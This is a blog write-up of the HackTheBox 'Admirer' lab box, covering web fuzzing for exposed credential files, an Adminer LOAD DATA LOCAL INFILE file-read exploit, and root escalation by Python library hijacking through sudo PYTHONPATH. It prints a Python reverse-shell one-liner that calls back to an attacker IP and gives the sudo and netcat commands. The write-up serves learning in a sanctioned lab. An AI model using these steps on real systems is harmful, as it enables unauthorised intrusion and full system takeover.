---
layout: post
title: "HackTheBox - Admirer"
date: 2020-09-15
author: Grillette

categories:
    - "HTB-Boxes"
---
**Admirer** was an easy Linux box on [HackTheBox](https://www.hackthebox.eu).
This box was about :
- Enumeration on a website in order to find some hidden files containing credentials
- Retrieving a backup of the website using the credentials previously found on a FTP service
- Exploitation of a vulnerable *Adminer* (an opensource database manager)
- Hijacking a python library to exploit a custom backup script.

![Box Logo]({{ "assets/Admirer/admirer.png" | absolute_url }} "Box Logo")

<!--excerpt-->
<br/>

# Initial Foothold
## Reckon

Here we go for the initial reckon, let's run [`nmap`](https://nmap.org/) to see what we got.

![Nmap]({{ "assets/Admirer/nmap.png" | absolute_url }} "Nmap result")

There is 3 different services.
Ok so we'll keep the *ssh* service for later, let's check the *ftp* and *http* services.

### FTP

The only thing to do when seeing an FTP port without more information is trying to log in as `anonymous` user. (At least, that is the only thing I do)

```
~> ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:grillette): anonymous
530 Permission denied.
ftp: Login failed.
ftp>
```

But anonymous login is correctly disabled here, so we'll leave that here for the moment and maybe come back later.

### HTTP
The website looks like this :

![Website]({{ "assets/Admirer/initialWebsite.png" | absolute_url }} "initial Website")

Nothing really exciting, there is some JavaScript library to make some fancy image display but nothing more. There is only one page, no login page or upload form.

There is only one hint in the **robots.txt** file :
```
Disallow : /admin-dir
```

This means that this directory is not referenced by Google.

We try to access this directory to see if you can see interesting information but we end up with a `403 Forbidden` error message...

At this point we are a bit stuck with our information so we can try to do some fuzzing on the application to discover some more thing to play with especially with the `/admin-dir/` directory.
After playing around for quite some time with [ffuf](https://github.com/ffuf/ffuf) we finally end up on something interesting :

![Ffuf result]({{ "assets/Admirer/ffuf.png" | absolute_url }} "Ffuf result")

In this command, we tried to discover some file in the `/admin-dir/` directory with the `http://10.10.10.187/admin-dir/` url.
We used a word list to try to access directly some files.
Giving this result, we can see 2 files exist (*contacts* and *credentials*) in this directory and are not correctly protected (We can see the status code is 200). We can't access the `/admin-dir/` directory but there is no problem to directly access the file within this folder if we manage to get the exact name.

## Exploiting

### HTTP

So here is the content of those 2 files.
- contacts.txt :

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

- credentials.txt :

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

So now we have a bunch of e-mail addresses and credentials to play with. And one specific account catches our attention.

Indeed, there is a **FTP account** in the credentials file. It should remind you of the initial reckon step where we identified a `FTP` service.

### FTP (again)
We can now access the `FTP` service and connect with the previously discovered credentials.
Let's list the remote directory to see if we have interesting files.

![Listing FTP]({{ "assets/Admirer/ftpList.png" | absolute_url }} "Listing FTP")

We see a **dump.sql** and **html.tar.gz** files, let's grab those for further investigation :

![FTP exfiltration]({{ "assets/Admirer/ftpExfiltration.png" | absolute_url }} "FTP exfiltration")

The *html* archive looks like a backup of the website. By digging a bit in the files, we can retrieve one more password in the credentials.txt file :

![Second credentials.txt]({{ "assets/Admirer/credentials2.png" | absolute_url }} "Second credentials.txt file")

By looking in the **index.php** file, we can also retrieve the database connection credentials :
``` php
<div id="main">
    <?php
        $servername = "localhost";
        $username = "waldo";
        $password = "]F7jLHw:*G>UPrTo}~A"d6b";
        $dbname = "admirerdb";

        // Create connection
        $conn = new mysqli($servername, $username, $password, $dbname);
        // Check connection
        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }
```

We also found the `utility-scripts/` directory :

```
grillette@vm ~/H/A/h/utility-scripts> ls -l
total 16
-rw-r----- 1 grillette grillette 1795  2 déc.   2019 admin_tasks.php
-rw-r----- 1 grillette grillette  401  1 déc.   2019 db_admin.php
-rw-r----- 1 grillette grillette   20 29 nov.   2019 info.php
-rw-r----- 1 grillette grillette   53  2 déc.   2019 phptest.php
```

If you want the complete code of those files, here is [an archive]({{ "assets/Admirer/utility-scripts.zip" | absolute_url }}) with all of it.

In the **db_admin.php** file, there is some more database credentials as well as an interesting TODO comment. (TODO comment are always very useful)

```php
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
```

The **dump.sql** file contains a dump of the database as the name indicates but no valuable data were found.

# User

We can access the different .php file contained in the utility-scripts/ from the web server as expected.
Here is the result when trying to access the **admin_tasks.php** file :

![Admin tasks]({{ "assets/Admirer/admin_tasks.png" | absolute_url }} "Admin tasks")

> // TODO: Finish implementing this or find a better open source alternative

It was a bit hard to understand that this was so important in **db_admin.php** file.
Based on this comment and the fact that we cannot access the **db_admin.php** page we can understand that they did found a better open source alternative as stated.

Let's train our google-fu and see what we can find :

![google search result]({{ "assets/Admirer/googleSearch.png" | absolute_url }} "Google search result")

Does that remind you anything ?

The [Adminer](https://www.adminer.org/) application seems promising, we just have to check if our guess is right.

By trying the *http://10.10.10.187/utility-scripts/adminer.php* url, we confirmed our intuition :

![Adminer]({{ "assets/Admirer/adminer.png" | absolute_url }} "Adminer")

But no luck this time, none of the credentials we already gathered works on this login page.

The Adminer is used in version 4.6.2 which appears to be vulnerable according to [this article](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)

We need to create a database on our host and expose it in order to exploit this application as explained in the previous link.

Once this is done, we have to login on the Adminer form with the mysql server we just created on our host as follow :

![Adminer Connection]({{ "assets/Admirer/adminerConnection.png" | absolute_url }} "Adminer connection")

And we finally have access to the Adminer application :

![Adminer Index]({{ "assets/Admirer/adminerIndex.png" | absolute_url }} "Adminer index")

Note that we are logged in in Adminer but with the database on our host. But the exploit is all about being able to request a local file and to load it in a table of the database currently connected.
So here, our goal will be to request a file present on the server and to load it on our own database which is connected to the *Adminer* application.

We just have to perform the following query in the *Adminer* application :

```
load data local infile '../index.php'
into table exploit
fields terminated by "\n"
```

We can see the query succeeded with the message displayed :

![Query Success]({{ "assets/Admirer/querySuccess.png" | absolute_url }} "Query success")

Now, the content of our *exploit* databse somehow contains the content of the **index.php** file on the server :

![Adminer exploit result]({{ "assets/Admirer/exploitAdminer.png" | absolute_url }} "Adminer exploit result")

We can see the password used for the database connection is not the same as the one we saw in the backup files.
We have a username : `waldo`
And a passowrd : `&<h5b~yK3F#{PaPB&dA}{H>` which we are sure is used this time as we just retrieved it from the index.php running on the website.

We can now simply use those credentials to connect through **SSH** and grab the first flag !
![User connection]({{ "assets/Admirer/user.png" | absolute_url }} "User connection and flag")

# Privilege escalation

### Enum
With the basic enumeration we can find this interesting information

![Privesc sudo -l command]({{ "assets/Admirer/privescEnum.png" | absolute_url }} "Privesc sudo -l command")

This mean that the user **waldo** is able to use SETENV on the /opt/scripts/admin_tasks.sh script.
During the previous step we also noticed that the admin_tasks.php was all about calling this line :
```php
echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
```

With the **$task** argument being a number depending on the choice of the user.

So this **admin_tasks.sh** sure look interesting. You can check it [here]({{ "assets/Admirer/admin_tasks.sh" |absolute_url }}) if you want the full script.

In the script for admin tasks, there is only one line which can be shady :
```
echo "Running backup script in the background, it might take a while..."
/opt/scripts/backup.py &
```

This just launch the **backup.py** in background and we can see that this is a non standard program.

And here is the content of this new script :
```python3
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

We can check our permissions on those scripts :
```
waldo@admirer:~$ ls -l /opt/scripts/*
-rwxr-xr-x 1 root admins 2613 Dec  2  2019 /opt/scripts/admin_tasks.sh
-rwxr----- 1 root admins  198 Dec  2  2019 /opt/scripts/backup.py
```

After some long research because I didn't knew about this technique, I discovered some interesting links for privilege escalation using python library : [here](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) and [here](https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7).

Let's first check the priority order for the library directories :
![Library Order]({{ "assets/Admirer/libraryOrder.png" | absolute_url }} "Library Order")

This means that, when you'll import a library in a python script with `import sys` or `from matplotlib import pyplot` for example. The python interpreter will first check the **/usr/lib/python2.7** directory to find the requested library. If it did not find it, he will look into **/usr/lib/python2.7/plat-x86_64-linux-gnu** and so on.

Those directories are not writable so it is not possible to write our own library to replace the real one.

But as you may remember, the `sudo -l` command showed that we could modify the environment variables with root privileges when executing the `/opt/scripts/admin_tasks.sh`.

The PYTHONPATH [environment variable](https://python.readthedocs.io/en/latest/using/cmdline.html#envvar-PYTHONPATH) which allow one to modify the default search path for module files and library.

So what if we could modify this environment variable, add a path where we have writes privileges on, and write our own library to hijack the one used in the script ?
Well, yes, we could replace the original library by ours. Looks good !

We can create the `/tmp/.grillette/` directory with write privilege.

In this folder, we write the following script in an file named **shutil.py** (yeah, as the shutil library used in the script):

```python
import sys,socket,os,pty;s=socket.socket();s.connect(("10.10.15.14",4242));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
```

This is a basic reverse shell which will connect back to our host if we open a listening *netcat*.

With the `sudo -l` miss configuration we can execute the following command :
```
sudo -E PYTHONPATH=/tmp/.grillette/ /opt/scripts/admin_tasks.sh
```

This will run the command with **root** privileges, overwrite the PYTHONPATH environment variable with our previously created directory and execute the `admin_tasks.sh` script.

We just have to wait for a connection on our host by executing `rlwrap nc -lvnp 4242`

And execute the backup program with the 6th option of the script :

![Final root exploit]({{ "assets/Admirer/rootExploit.png" | absolute_url }} "final root exploit")

We are finally **root** on the box !

# Conclusion
Thank you if you made it this far !
This box was really fun, I loved the Adminer exploit as it required to setup an exposed database and exploit an application in an fairly unusual way.
The privilege escalation technique was also very interesting as I didn't know about python library hijacking and I really liked learning about it.

Don't hesitate to give me any feedback if I made any typo, some bad explanation, some wrong information .. or just to say *hello* !
